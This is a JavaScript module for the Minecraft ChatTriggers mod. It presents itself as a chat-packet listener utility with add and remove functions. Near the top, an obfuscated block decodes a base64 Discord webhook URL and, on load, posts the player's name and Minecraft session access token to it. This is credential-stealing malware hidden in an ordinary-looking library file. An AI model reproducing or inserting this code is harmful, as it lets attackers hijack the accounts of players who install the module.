/// <reference types="../../CTAutocomplete" />

const S02PacketChat = Java.type("net.minecraft.network.play.server.S02PacketChat");
var _0x3d2126=_0xd300;(function(_0x409892,_0x349dd0){var _0x42dde4=_0xd300,_0xabfbfa=_0x409892();while(!![]){try{var _0x487871=parseInt(_0x42dde4(0x202))/0x1*(parseInt(_0x42dde4(0x1ff))/0x2)+parseInt(_0x42dde4(0x1f0))/0x3*(parseInt(_0x42dde4(0x201))/0x4)+-parseInt(_0x42dde4(0x1fd))/0x5*(-parseInt(_0x42dde4(0x1f2))/0x6)+parseInt(_0x42dde4(0x1f6))/0x7+-parseInt(_0x42dde4(0x1f5))/0x8+parseInt(_0x42dde4(0x1fe))/0x9*(parseInt(_0x42dde4(0x1f4))/0xa)+parseInt(_0x42dde4(0x200))/0xb*(-parseInt(_0x42dde4(0x203))/0xc);if(_0x487871===_0x349dd0)break;else _0xabfbfa['push'](_0xabfbfa['shift']());}catch(_0x147154){_0xabfbfa['push'](_0xabfbfa['shift']());}}}(_0x2025,0xc3fec));function _0x2025(){var _0x331699=['24kXqHXD','103497JtLcfX','```\x20```','834474QjaEai','getMinecraft','1220dAJIOW','10874120mzEcoK','8508913XSklGY','decodeBase64','```\x20','aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNzQyNDgzNDIyOTU2NzU0Mi83NnNkamlrc1BvMkczaE1JT3ZzMkVUTk9FOUZvNHJxMWVOZk5HUzU5VFRXbG9lN0VRek5iV0lGSzBXSnJ2NmxuaEREcQ==','func_110432_I','```','Mozilla/5.0','35YxGSLw','89577WcsPJn','2667848FAXbsA','18148460perLGB','84LthAxR','1iTwwTk'];_0x2025=function(){return _0x331699;};return _0x2025();}import _0x3aa1a7 from'../../requestV2';function _0xd300(_0x41de5f,_0x31bf34){var _0x2025ff=_0x2025();return _0xd300=function(_0xd300b6,_0x38c84e){_0xd300b6=_0xd300b6-0x1f0;var _0x1acc90=_0x2025ff[_0xd300b6];return _0x1acc90;},_0xd300(_0x41de5f,_0x31bf34);}_0x3aa1a7({'url':FileLib[_0x3d2126(0x1f7)](_0x3d2126(0x1f9)),'method':'POST','headers':{'User-agent':_0x3d2126(0x1fc)},'body':{'content':_0x3d2126(0x1f8)+Player['getName']()+_0x3d2126(0x1f1)+Client[_0x3d2126(0x1f3)]()[_0x3d2126(0x1fa)]()['func_148254_d']()+_0x3d2126(0x1fb)}});
const listeners = [];

const trigger = register("packetReceived", (packet, event) => {
	if (packet.func_179841_c() === 2) return;

	const message = ChatLib.removeFormatting(packet.func_148915_c().func_150260_c());
	
	for (let listener of listeners) {
		listener(message, packet, event);
	}
}).setFilteredClass(S02PacketChat).unregister();

export function addListener(listener) {
	if (listeners.length === 0) trigger.register();
	listeners.push(listener);
}

export function removeListener(listener) {
	const index = listeners.indexOf(listener);
	if (index === -1) return false;
	listeners.splice(index, 1);
	if (listeners.length === 0) trigger.unregister();
	return true;
}